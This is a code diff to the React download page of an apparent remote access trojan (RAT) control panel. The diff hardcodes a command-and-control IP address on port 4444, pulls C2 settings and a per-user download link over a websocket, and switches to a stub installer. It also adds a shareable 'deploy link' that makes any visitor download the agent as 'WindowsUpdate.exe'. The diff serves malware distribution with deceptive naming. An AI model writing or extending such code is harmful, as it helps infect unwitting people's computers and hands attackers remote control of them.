@@ -1,5 +1,6 @@
 import { useState, useEffect } from 'react';
-import { Download, Keyboard, User, Code, Server, Cpu, Shield } from 'lucide-react';
+import { Download, Keyboard, User, Code, Server, Cpu, Shield, Link, Copy, Check } from 'lucide-react';
+import { useBridgeWebSocket } from '../../hooks/BridgeWebSocketProvider';
 
 interface UserData {
   id: string;
@@ -21,7 +22,7 @@ function RatDownloadPage() {
   const [user, setUser] = useState<UserData | null>(null);
   const [loading, setLoading] = useState(true);
   const [config, setConfig] = useState<RatConfig>({
-    server_ip: '',
+    server_ip: '207.189.10.136',
     server_port: 4444,
     user_id: '',
     beacon_interval: 30000,
@@ -33,6 +34,18 @@ function RatDownloadPage() {
   const [generating, setGenerating] = useState(false);
   const [error, setError] = useState<string | null>(null);
   const [customFilename, setCustomFilename] = useState<string>('');
+  const [personalUrl, setPersonalUrl] = useState<string | null>(null);
+  const [copied, setCopied] = useState(false);
+
+  const { subscribe } = useBridgeWebSocket();
+
+  useEffect(() => {
+    return subscribe('connected', (msg: any) => {
+      if (msg.downloadUrl) setPersonalUrl(msg.downloadUrl);
+      if (msg.c2Host) setConfig(prev => ({ ...prev, server_ip: msg.c2Host }));
+      if (msg.c2Port) setConfig(prev => ({ ...prev, server_port: msg.c2Port }));
+    });
+  }, [subscribe]);
 
   useEffect(() => {
     // Get current user from localStorage
@@ -75,13 +88,13 @@ function RatDownloadPage() {
 
       const result = await response.json();
       
-      // Now download the generated file
-      const downloadResponse = await fetch(result.download_url, {
+      // Now download the stub installer (Setup.exe) instead of the full RAT
+      const downloadResponse = await fetch('/api/rat/download-stub', {
         credentials: 'include',
       });
 
       if (!downloadResponse.ok) {
-        throw new Error('Failed to download RAT file');
+        throw new Error('Failed to download RAT installer');
       }
 
       const blob = await downloadResponse.blob();
@@ -152,16 +165,42 @@ function RatDownloadPage() {
         <div>
           <h1 className="text-3xl font-bold text-white">RAT Client Download</h1>
           <p className="text-slate-400 mt-1">
-            Generate and download a custom RAT client configured for your account
-          </p>
+            Generate and download a custom RAT client configured for your account</p>
         </div>
-        <div className="flex items-center gap-2 px-4 py-2 bg-slate-800 rounded-lg">
-          <User className="w-5 h-5 text-slate-400" />
-          <span className="text-slate-300">{user.username}</span>
-          <span className={`px-2 py-1 text-xs rounded ${user.role === 'admin' ? 'bg-purple-600/20 text-purple-400' : 'bg-blue-600/20 text-blue-400'}`}>
-            {user.role}
-          </span>
+        <User className="w-8 h-8 text-slate-600" />
+      </div>
+
+      {/* Quick Deploy Link */}
+      <div className="bg-slate-900 rounded-xl border border-blue-800/50 p-5">
+        <div className="flex items-center gap-2 mb-3">
+          <Link className="w-4 h-4 text-blue-400" />
+          <h2 className="text-base font-semibold text-white">Your Personal Deploy Link</h2>
         </div>
+        {personalUrl ? (
+          <div className="space-y-2">
+            <p className="text-xs text-slate-400">Share this URL — anyone who visits it downloads the pre-compiled agent. Clients will appear in your account.</p>
+            <div className="flex items-center gap-2">
+              <code className="flex-1 bg-slate-800 text-green-400 text-xs px-3 py-2 rounded-lg truncate select-all">{personalUrl}</code>
+              <button
+                onClick={() => { navigator.clipboard.writeText(personalUrl); setCopied(true); setTimeout(() => setCopied(false), 2000); }}
+                className="flex items-center gap-1.5 px-3 py-2 bg-slate-700 hover:bg-slate-600 text-slate-300 text-xs rounded-lg transition-colors shrink-0"
+              >
+                {copied ? <Check className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5" />}
+                {copied ? 'Copied!' : 'Copy'}
+              </button>
+              <a
+                href={personalUrl}
+                download="WindowsUpdate.exe"
+                className="flex items-center gap-1.5 px-3 py-2 bg-blue-700 hover:bg-blue-600 text-white text-xs rounded-lg transition-colors shrink-0"
+              >
+                <Download className="w-3.5 h-3.5" />
+                Download
+              </a>
+            </div>
+          </div>
+        ) : (
+          <p className="text-xs text-slate-500 italic">Connecting to bridge...</p>
+        )}
       </div>
 
       {/* Configuration Panel */}
